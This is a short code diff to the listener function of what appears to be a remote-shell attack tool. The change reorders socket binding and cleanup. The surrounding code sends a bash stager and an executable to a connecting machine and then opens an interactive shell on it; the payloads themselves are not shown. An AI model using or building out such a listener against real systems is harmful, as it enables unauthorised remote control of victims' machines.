@@ -299,11 +299,7 @@ def shell():
 
 def server(LHOST, LPORT, handler=handler):
     global s, a, c, unicorn
-    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    s.bind((LHOST, LPORT))
-    s.listen(1)
-
+    
     print(G + "Binding to " + LHOST + ":" + str(LPORT) + "...")
     try:
         sock = socket.socket()
@@ -312,7 +308,17 @@ def server(LHOST, LPORT, handler=handler):
         sock.listen(1)
     except:
         print(E + "Failed to bind to " + LHOST + ":" + str(LPORT) + "!")
+        try: 
+            sock.close()
+        except:
+            pass
         sys.exit()
+    sock.close()
+    
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    s.bind((LHOST, LPORT))
+    s.listen(1)
 
     try:
         print(G + "Listening on port " + str(LPORT) + "...")
@@ -323,11 +329,9 @@ def server(LHOST, LPORT, handler=handler):
 
         c.send(bash_stager.encode())
         c.send(executable)
-        c.close()
-        s.close()
 
         print(G + "Establishing connection...")
-        c, a = sock.accept()
+        c, a = s.accept()
 
         unicorn = handler(c)
         shell()
